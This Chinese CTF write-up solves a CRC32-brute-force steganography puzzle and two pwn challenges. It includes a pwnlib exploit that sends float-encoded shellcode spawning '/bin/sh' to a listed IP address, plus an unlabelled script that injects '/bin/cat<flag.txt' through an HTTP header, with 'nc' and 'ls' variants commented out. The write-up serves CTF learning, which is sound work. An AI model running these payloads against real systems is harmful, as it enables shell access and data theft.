misc 10 小可爱（传说中的神坑题）
相信你看完了WriteUp，你就知道为什么此题被标榜为神坑题。这道题的考点在于密码爆破以及“隐写”。
（点击查看大图）

1、将图片下载之后，用binwalk跑图片文件，发现里面有个zip压缩包。

2、提取压缩包，发现zip压缩被加密了，并且提示密码是8位数字。根据tips得知密码是txt中的串。而且txt只有8字节，且 CRC32 是 bacab29e，暴力出结果。
附上脚本：
import zlib
for i in xrange(0,100000000):
buf = str(i).rjust(8,'0')
#print buf
if zlib.crc32(buf) & 0xffffffff == 0xbacab29e:
print '[*]',buf
if i % 1000000 == 0: print i
#if i % 10: break

PWN 50 loading
这道题的代码逻辑为：
在读取整数，然后除以 2333 得到浮点数， 将其连接成 shellcode 并执行，
如下：

其实就是利用了浮点数里面存着固定的数，可以用来编写 shellcode。 
附上某表哥改写的脚本：
import struct
import pwnlib
import time
def get_int(s):
a = struct.unpack('<f', s)[0]* 2333.0
return struct.unpack('I', struct.pack('<I', a))[0]
#target = pwnlib.tubes.remote.remote('fixedpoint.pwning.xxx', 7777, ssl=False)
target = pwnlib.tubes.remote.remote('106.75.84.68', 20000, ssl=False)
print "Sending IEEE754 shellcode..."
time.sleep(1)
for i in range(3):
target.sendline(str(get_int('\x00\x00\x00\x00')))
target.sendline(str(get_int('\x99\x89\xc3\x47'))) # mov ebx, eax
target.sendline(str(get_int('\x41\x44\x44\x44'))) # nop/align
for c in '/bin/sh\x00':
target.sendline(str(get_int('\x99\xb0'+c+'\x47'))) # mov al, c
target.sendline(str(get_int('\x57\x89\x03\x43'))) # mov [ebx], eax; inc ebx
for i in range(8):
target.sendline(str(get_int('\x57\x4b\x41\x47'))) # dec ebx
target.sendline(str(get_int('\x99\x31\xc0\x47'))) # xor eax, eax
target.sendline(str(get_int('\x99\x31\xc9\x47'))) # xor ecx, ecx
target.sendline(str(get_int('\x99\x31\xd2\x47'))) # xor edx, edx
target.sendline(str(get_int('\x99\xb0\x0b\x47'))) # mov al, 0xb
target.sendline(str(get_int('\x99\xcd\x80\x47'))) # int 0x80
target.sendline('c')
target.interactive()

from zio import *

from pwn import *
def pwn(io):
t_target = "useragent"
user_agent = ""
for index, item in enumerate(t_target):
user_agent += chr(index^ord(item))
print "user_agent:", user_agent
payload = ""
payload += "User-Agent: %s\r\n"%(user_agent)
#payload += "token: /bin/ls -al"
payload += "token: /bin/cat<flag.txt"
#payload += "token: nc 0 8090\r\n"
payload += "\r\n\r\n"
io.gdb_hint()
io.write(payload)
io.interact()

pwn(io)
